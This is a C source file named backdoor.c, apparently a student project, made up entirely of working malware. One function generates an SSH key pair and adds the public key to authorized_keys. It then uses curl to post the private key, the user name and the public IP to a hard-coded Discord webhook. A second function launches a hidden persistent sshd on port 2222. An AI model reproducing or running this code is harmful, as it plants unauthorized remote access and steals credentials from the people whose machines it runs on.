/**
 * @file backdoor.c
 *
 * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
 * @date 2026
 */

#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <netinet/in.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/**
 * @brief Generating a ssh keys pair and configure a backdoor
 *
 * Creation of a pair of RSA 2048 bits in  ~/.ssh/id_rsa_basique, and add the
 * key in ~/.ssh/authorized_keys, exfiltration of the private key by Discord
 * webhook whith the public IP and the name of the user.
 *
 * @return void
 */
void ssh_backdoor() {
  char *home = getenv("HOME");
  if (!home)
    return;

  char *user = getenv("USER");
  if (!user)
    return;

  FILE *fp = popen("curl -s ifconfig.me", "r");
  if (!fp)
    return;

  char ip[128];
  if (fgets(ip, sizeof(ip), fp) == NULL) {
    pclose(fp);
    return;
  }

  pclose(fp);

  ip[strcspn(ip, "\n")] = '\0';

  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];
  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

  mkdir(ssh_dir, 0700);
  chmod(ssh_dir, 0700);

  if (access(priv_key, F_OK) != 0) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q",
             priv_key);
    system(cmd);
  }

  FILE *pubf = fopen(pub_key, "r");
  if (!pubf)
    return;

  char pub_content[2048];
  size_t len = fread(pub_content, 1, sizeof(pub_content) - 1, pubf);
  pub_content[len] = '\0';
  fclose(pubf);

  FILE *authf = fopen(auth_keys, "a");
  if (authf) {
    fprintf(authf, "\n%s\n", pub_content);
    fclose(authf);
    chmod(auth_keys, 0600);
  }

  FILE *f = fopen(priv_key, "r");
  if (!f)
    return;
  char key_content[4096] = {0};
  fread(key_content, 1, sizeof(key_content) - 1, f);
  fclose(f);

  char escaped_key[8192] = {0};
  int j = 0;
  for (int i = 0; key_content[i] && j < sizeof(escaped_key) - 10; i++) {
    if (key_content[i] == '"' || key_content[i] == '\\') {
      escaped_key[j++] = '\\';
      escaped_key[j++] = key_content[i];
    } else if (key_content[i] == '\n') {
      escaped_key[j++] = '\\';
      escaped_key[j++] = 'n';
    } else if (key_content[i] == '\r') {
      escaped_key[j++] = '\\';
      escaped_key[j++] = 'r';
    } else {
      escaped_key[j++] = key_content[i];
    }
  }

  char json_payload[16384];
  snprintf(
      json_payload, sizeof(json_payload),
      "{\"content\":\"**SSH KEY EXFIL**\\n\\n```\\n%s\\n```\\n`ssh %s@%s`\"}",
      escaped_key, user, ip);

  char exfil_cmd[17000];
  snprintf(
      exfil_cmd, sizeof(exfil_cmd),
      "curl -s -X POST https://discord.com/api/webhooks/1485416783706853558/"
      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB "
      "-H 'Content-Type: application/json' -d '%s' > /dev/null 2>&1",
      json_payload);
  system(exfil_cmd);
}

/**
 * @brief Deploys a persistence SShd server on the port 2222
 *
 * @details
 *  - Creation of the hostkeys Ed25519 + RSA 3072 bits in ./hostkeys/
 *  - Verifying if an sshd:2222 already exist by the PID file
 *  - Fork + execv sshd with :
 *    * Port 2222 only
 *    * Authentification by key only (no password)
 *    * No root login
 *    * PID file for persistence
 *    * No privilege separation (easyer)
 *
 * @return PID of the process sshd (0 if already active)
 */
int ssh_persistent_server() {
#define HOSTKEY_DIR "./.hostkeys"
#define ED25519_KEY "./.hostkeys/ssh_host_ed25519_key"
#define RSA_KEY "./.hostkeys/ssh_host_rsa_key"
#define PID_FILE "./.hostkeys/sshd_2222.pid"
#define SSHD_PATH "/usr/sbin/sshd"

  mkdir(HOSTKEY_DIR, 0700);
  if (access(ED25519_KEY, F_OK)) {
    system("ssh-keygen -t ed25519 -f .hostkeys/ssh_host_ed25519_key -N '' -q");
  }
  if (access(RSA_KEY, F_OK)) {
    system("ssh-keygen -t rsa -b 3072 -f .hostkeys/ssh_host_rsa_key -N '' -q");
  }
  chmod(ED25519_KEY, 0600);
  chmod(RSA_KEY, 0600);

  FILE *pidf = fopen(PID_FILE, "r");
  if (pidf) {
    pid_t pid;
    fscanf(pidf, "%d", &pid);
    fclose(pidf);
    if (kill(pid, 0) == 0) {
      return 0;
    }
  }

  pid_t pid = fork();
  if (pid == 0) {
    char *args[] = {SSHD_PATH,
                    "-D",
                    "-p",
                    "2222",
                    "-h",
                    ED25519_KEY,
                    "-h",
                    RSA_KEY,
                    "-o",
                    "PidFile=.hostkeys/sshd_2222.pid",
                    "-o",
                    "PasswordAuthentication=no",
                    "-o",
                    "PermitRootLogin=no",
                    NULL};
    execv(SSHD_PATH, args);
    exit(1);
  }

  sleep(2);
  return pid;
}
